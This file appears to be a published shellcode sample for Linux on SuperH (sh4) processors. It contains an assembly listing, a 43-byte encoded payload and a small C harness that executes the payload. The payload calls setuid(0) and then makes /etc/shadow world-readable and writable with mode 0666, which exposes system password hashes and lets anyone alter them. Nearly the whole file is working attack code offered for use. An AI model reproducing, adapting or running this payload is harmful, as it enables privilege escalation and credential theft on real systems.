/*
** Title:     Linux/SuperH - sh4 - setuid(0) - chmod("/etc/shadow", 0666) - exit(0) - 43 bytes
** Date:      2011-06-22
** Tested on: Debian-sh4 2.6.32-5-sh7751r
** Author:    Jonathan Salwan - twitter: @jonathansalwan
**
** http://shell-storm.org
**
**
** seteuid:
** 	mov 	#23, r3
** 	xor	r4, r4
** 	trapa 	#2
** chmod:
** 	mov	#15, r3
** 	mova	@(24, pc), r0
** 	mov	r0, r4
** 	mov	#87, r8
** 	mov	#5, r9
** 	mul.l	r8, r9
** 	sts	macl, r5
** 	add	#3, r5
** 	trapa	#2
** exit:
** 	xor	r3, r3
** 	mov	#1, r3
** 	xor	r4, r4
** 	trapa 	#2
** file:
** 	.string "/etc/shadow"
**
*/

#include <stdio.h>
#include <string.h>

char *SC = "\x17\xe3\x4a\x24\x02\xc3\x0f\xe3\x05\xc7\x03"
           "\x64\x57\xe8\x05\xe9\x87\x09\x1a\x05\x03\x75"
           "\x02\xc3\x3a\x23\x01\xe3\x4a\x24\x02\xc3\x2f"
           "\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77";

int main(void)
{
  fprintf(stdout,"Length: %d\n",strlen(SC));
  (*(void(*)()) SC)();
}